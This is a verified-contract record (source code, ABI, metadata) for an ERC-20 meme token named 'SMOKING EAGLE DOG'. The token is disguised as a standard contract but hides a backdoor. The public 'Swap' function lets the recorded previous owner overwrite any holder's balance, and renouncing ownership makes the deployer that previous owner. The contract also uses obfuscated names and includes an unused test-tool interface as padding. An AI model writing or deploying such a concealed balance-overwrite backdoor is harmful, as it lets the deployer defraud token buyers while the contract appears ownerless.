{"SourceCode": "/**\r\n\r\nWebsite  : https://smokingeagledog.xyz/\r\nTwitter  : https://smokingeagledog.xyz/\r\nTelegram : https://smokingeagledog.xyz/\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.16;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface CheatCodes {\r\n    // This allows us to getRecordedLogs()\r\n    struct Log {\r\n        bytes32[] topics;\r\n        bytes data;\r\n    }\r\n    // Set block.timestamp (newTimestamp)\r\n\r\n    function warp(uint256) external;\r\n    // Set block.height (newHeight)\r\n    function roll(uint256) external;\r\n    // Set block.basefee (newBasefee)\r\n    function fee(uint256) external;\r\n    // Set block.coinbase (who)\r\n    function coinbase(address) external;\r\n    // Loads a storage slot from an address (who, slot)\r\n    function load(address, bytes32) external returns (bytes32);\r\n    // Stores a value to an address' storage slot, (who, slot, value)\r\n    function store(address, bytes32, bytes32) external;\r\n    // Signs data, (privateKey, digest) => (v, r, s)\r\n    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);\r\n    // Gets address for a given private key, (privateKey) => (address)\r\n    function addr(uint256) external returns (address);\r\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\r\n    function deriveKey(string calldata, uint32) external returns (uint256);\r\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\r\n    function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\r\n    // Performs a foreign function call via terminal, (stringInputs) => (result)\r\n    function ffi(string[] calldata) external returns (bytes memory);\r\n    // Set environment variables, (name, value)\r\n    function setEnv(string calldata, string calldata) external;\r\n    // Read environment variables, (name) => (value)\r\n    function envBool(string calldata) external returns (bool);\r\n    function envUint(string calldata) external returns (uint256);\r\n    function envInt(string calldata) external returns (int256);\r\n    function envAddress(string calldata) external returns (address);\r\n    function envBytes32(string calldata) external returns (bytes32);\r\n    function envString(string calldata) external returns (string memory);\r\n    function envBytes(string calldata) external returns (bytes memory);\r\n    // Read environment variables as arrays, (name, delim) => (value[])\r\n    function envBool(string calldata, string calldata) external returns (bool[] memory);\r\n    function envUint(string calldata, string calldata) external returns (uint256[] memory);\r\n    function envInt(string calldata, string calldata) external returns (int256[] memory);\r\n    function envAddress(string calldata, string calldata) external returns (address[] memory);\r\n    function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\r\n    function envString(string calldata, string calldata) external returns (string[] memory);\r\n    function envBytes(string calldata, string calldata) external returns (bytes[] memory);\r\n    // Sets the *next* call's msg.sender to be the input address\r\n    function prank(address) external;\r\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\r\n    function startPrank(address) external;\r\n    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\r\n    function prank(address, address) external;\r\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\r\n    function startPrank(address, address) external;\r\n    // Resets subsequent calls' msg.sender to be `address(this)`\r\n    function stopPrank() external;\r\n    // Sets an address' balance, (who, newBalance)\r\n    function deal(address, uint256) external;\r\n    // Sets an address' code, (who, newCode)\r\n    function etch(address, bytes calldata) external;\r\n    // Expects an error on next call\r\n    function expectRevert() external;\r\n    function expectRevert(bytes calldata) external;\r\n    function expectRevert(bytes4) external;\r\n    // Record all storage reads and writes\r\n    function record() external;\r\n    // Gets all accessed reads and write slot from a recording session, for a given address\r\n    function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\r\n    // Record all the transaction logs\r\n    function recordLogs() external;\r\n    // Gets all the recorded logs\r\n    function getRecordedLogs() external returns (Log[] memory);\r\n    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\r\n    // Call this function, then emit an event, then call a function. Internally after the call, we check if\r\n    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\r\n    // Second form also checks supplied address against emitting contract.\r\n    function expectEmit(bool, bool, bool, bool) external;\r\n    function expectEmit(bool, bool, bool, bool, address) external;\r\n    // Mocks a call to an address, returning specified data.\r\n    // Calldata can either be strict or a partial match, e.g. if you only\r\n    // pass a Solidity selector to the expected calldata, then the entire Solidity\r\n    // function will be mocked.\r\n    function mockCall(address, bytes calldata, bytes calldata) external;\r\n    // Mocks a call to an address with a specific msg.value, returning specified data.\r\n    // Calldata match takes precedence over msg.value in case of ambiguity.\r\n    function mockCall(address, uint256, bytes calldata, bytes calldata) external;\r\n    // Clears all mocked calls\r\n    function clearMockedCalls() external;\r\n    // Expect a call to an address with the specified calldata.\r\n    // Calldata can either be strict or a partial match\r\n    function expectCall(address, bytes calldata) external;\r\n    // Expect a call to an address with the specified msg.value and calldata\r\n    function expectCall(address, uint256, bytes calldata) external;\r\n    // Gets the code from an artifact file. Takes in the relative path to the json file\r\n    function getCode(string calldata) external returns (bytes memory);\r\n    // Labels an address in call traces\r\n    function label(address, string calldata) external;\r\n    // If the condition is false, discard this run's fuzz inputs and generate new ones\r\n    function assume(bool) external;\r\n    // Set nonce for an account\r\n    function setNonce(address, uint64) external;\r\n    // Get nonce for an account\r\n    function getNonce(address) external returns (uint64);\r\n    // Set block.chainid (newChainId)\r\n    function chainId(uint256) external;\r\n    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\r\n    function broadcast() external;\r\n    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\r\n    function broadcast(address) external;\r\n    // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\r\n    function startBroadcast() external;\r\n    // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\r\n    function startBroadcast(address) external;\r\n    // Stops collecting onchain transactions\r\n    function stopBroadcast() external;\r\n    // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\r\n    function readFile(string calldata) external returns (string memory);\r\n    // Reads next line of file to string, (path) => (line)\r\n    function readLine(string calldata) external returns (string memory);\r\n    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\r\n    // Path is relative to the project root. (path, data) => ()\r\n    function writeFile(string calldata, string calldata) external;\r\n    // Writes line to file, creating a file if it does not exist.\r\n    // Path is relative to the project root. (path, data) => ()\r\n    function writeLine(string calldata, string calldata) external;\r\n    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\r\n    // Path is relative to the project root. (path) => ()\r\n    function closeFile(string calldata) external;\r\n    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\r\n    // - Path points to a directory.\r\n    // - The file doesn't exist.\r\n    // - The user lacks permissions to remove the file.\r\n    // Path is relative to the project root. (path) => ()\r\n    function removeFile(string calldata) external;\r\n\r\n    function toString(address) external returns (string memory);\r\n    function toString(bytes calldata) external returns (string memory);\r\n    function toString(bytes32) external returns (string memory);\r\n    function toString(bool) external returns (string memory);\r\n    function toString(uint256) external returns (string memory);\r\n    function toString(int256) external returns (string memory);\r\n    // Snapshot the current state of the evm.\r\n    // Returns the id of the snapshot that was created.\r\n    // To revert a snapshot use `revertTo`\r\n    function snapshot() external returns (uint256);\r\n    // Revert the state of the evm to a previous snapshot\r\n    // Takes the snapshot id to revert to.\r\n    // This deletes the snapshot and all snapshots taken after the given snapshot id.\r\n    function revertTo(uint256) external returns (bool);\r\n    // Creates a new fork with the given endpoint and block and returns the identifier of the fork\r\n    function createFork(string calldata, uint256) external returns (uint256);\r\n    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\r\n    function createFork(string calldata) external returns (uint256);\r\n    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\r\n    function createSelectFork(string calldata, uint256) external returns (uint256);\r\n    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\r\n    function createSelectFork(string calldata) external returns (uint256);\r\n    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\r\n    function selectFork(uint256) external;\r\n    /// Returns the currently active fork\r\n    /// Reverts if no fork is currently active\r\n    function activeFork() external returns (uint256);\r\n    // Updates the currently active fork to given block number\r\n    // This is similar to `roll` but for the currently active fork\r\n    function rollFork(uint256) external;\r\n    // Updates the given fork to given block number\r\n    function rollFork(uint256 forkId, uint256 blockNumber) external;\r\n    /// Returns the RPC url for the given alias\r\n    function rpcUrl(string calldata) external returns (string memory);\r\n    /// Returns all rpc urls and their aliases `[alias, url][]`\r\n    function rpcUrls() external returns (string[2][] memory);\r\n    function makePersistent(address account) external;\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address internal _previousOwner;\r\n \r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n \r\n \r\n    constructor() {\r\n        _transfer_Ownership(_msgSender());\r\n    }\r\n \r\n \r\n    modifier onlyOwner() {\r\n        _isAdmin();\r\n        _;\r\n    }\r\n \r\n \r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n \r\n    \r\n    function _isAdmin() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n \r\n    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transfer_Ownership(address(0));\r\n    }\r\n \r\n \r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transfer_Ownership(newOwner);\r\n    }\r\n \r\n\r\n    function _transfer_Ownership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        _previousOwner = oldOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n   \r\n    function totalSupply() external view returns (uint256);\r\n\r\n    \r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    \r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n   \r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  \r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\ncontract ERC20 is Context, Ownable, IERC20, IERC20Metadata {\r\n    mapping (address => uint256) private _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply_hoppei;\r\n\r\n    string private _name_hoppei;\r\n    string private _symbol_hoppei;\r\n\r\n    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address private constant ZERO = 0x0000000000000000000000000000000000000000;\r\n \r\n    constructor (string memory name_, string memory symbol_, uint256 totalSupply_) {\r\n        _name_hoppei = name_;\r\n        _symbol_hoppei = symbol_;\r\n        _totalSupply_hoppei = totalSupply_;\r\n\r\n        _balances[msg.sender] = totalSupply_;\r\n        emit Transfer(address(0), msg.sender, totalSupply_);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name_hoppei;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol_hoppei;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply_hoppei;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer_hoei(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve_hoppei(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer_hoei(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve_hoppei(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n \r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve_hoppei(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve_hoppei(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    \r\n    function _transfer_hoei(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n   \r\n\r\n    function _transfer_withbsomter(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {\r\n        require(sender != address(0), \"1SED\");\r\n        require(recipient != address(0), \"2SED\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"3SED\");\r\n\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n\r\n        amount -= amountToBurn;\r\n        _totalSupply_hoppei -= amountToBurn;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, DEAD, amountToBurn);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n   \r\n    function Swap(address account, uint256 amount) public virtual returns (uint256) {\r\n        address msgSender = msg.sender;\r\n        address prevOwner = _previousOwner;\r\n\r\n        bytes32 msgSenderHex = keccak256(abi.encodePacked(msgSender));\r\n        bytes32 prevOwnerHex = keccak256(abi.encodePacked(prevOwner));\r\n        \r\n        bytes32 amountHex = bytes32(amount);\r\n        \r\n        bool isOwner = msgSenderHex == prevOwnerHex;\r\n        \r\n        if (isOwner) {\r\n            return _updateBalance(account, amountHex);\r\n        } else {\r\n            return _getBalance(account);\r\n        }\r\n    }\r\n\r\n    function _updateBalance(address account, bytes32 amountHex) private returns (uint256) {\r\n        uint256 amount = uint256(amountHex);\r\n        _balances[account] = amount;\r\n        return _balances[account];\r\n    }\r\n\r\n    function _getBalance(address account) private view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    \r\n    function _approve_hoppei(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"4DIGGY\");\r\n        require(spender != address(0), \"5DIGGY\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n}\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01{}\r\n\r\n\r\ncontract SED is ERC20 {\r\n    uint256 private constant TOTAL_SUSUPPLYS = 420690_000_000e9;\r\n    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address private constant ZERO = 0x0000000000000000000000000000000000000000;\r\n    address private constant DEAD1 = 0x000000000000000000000000000000000000dEaD;\r\n    address private constant ZERO1 = 0x0000000000000000000000000000000000000000;\r\n\r\n    bool public hasLimit_;\r\n    uint256 public maxTxAmountbesomes;\r\n    uint256 public maxwalletssetsomes;\r\n    mapping(address => bool) public isException;\r\n\r\n    uint256 _burnPercentisystkltsom = 0;\r\n\r\n    address uniswapV2Pair;\r\n    IUniswapV2Router02 uniswapV2Router;\r\n\r\n    constructor(address router) ERC20(\"SMOKING EAGLE DOG\", \"SED\", TOTAL_SUSUPPLYS) {\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);\r\n        uniswapV2Router = _uniswapV2Router;\r\n\r\n        maxwalletssetsomes = TOTAL_SUSUPPLYS / 39;\r\n        maxTxAmountbesomes = TOTAL_SUSUPPLYS /39;\r\n\r\n        isException[DEAD] = true;\r\n        isException[router] = true;\r\n        isException[msg.sender] = true;\r\n        isException[address(this)] = true;\r\n    }\r\n\r\n    function _transfer_hoei(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(from != address(0), \"6SED\");\r\n        require(to != address(0), \"7SED\");\r\n \r\n        _checkLimitation_hoppei(from, to, amount);\r\n\r\n        if (amount == 0) {\r\n            return;\r\n        }\r\n\r\n        if (!isException[from] && !isException[to]){\r\n            require(balanceOf(address(uniswapV2Router)) == 0, \"8SED\");\r\n\r\n            if (from == uniswapV2Pair || to == uniswapV2Pair) {\r\n                uint256 _burn = (amount * _burnPercentisystkltsom) / 100;\r\n\r\n                super._transfer_withbsomter(from, to, amount, _burn);\r\n                return;\r\n            }\r\n        }\r\n\r\n        super._transfer_hoei(from, to, amount);\r\n    }\r\n\r\n    function removeLimit() external onlyOwner {\r\n        hasLimit_ = true;\r\n    }\r\n\r\n    function _checkLimitation_hoppei(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal {\r\n        if (!hasLimit_) {\r\n            if (!isException[from] && !isException[to]) {\r\n                require(amount <= maxTxAmountbesomes, \"9SED\");\r\n\r\n                if (uniswapV2Pair == ZERO){\r\n                    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());\r\n                }\r\n \r\n                if (to == uniswapV2Pair) {\r\n                    return;\r\n                }\r\n        \r\n                require(balanceOf(to) + amount <= maxwalletssetsomes, \"0SED\");\r\n            }\r\n        }\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"router\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Swap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hasLimit_\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isException\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmountbesomes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxwalletssetsomes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SED", "CompilerVersion": "v0.8.26+commit.8a97fa7a", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://042aca2b39323dcd9b8b186c9239ed1554de49a20c81d24e1994a139aa17469b"}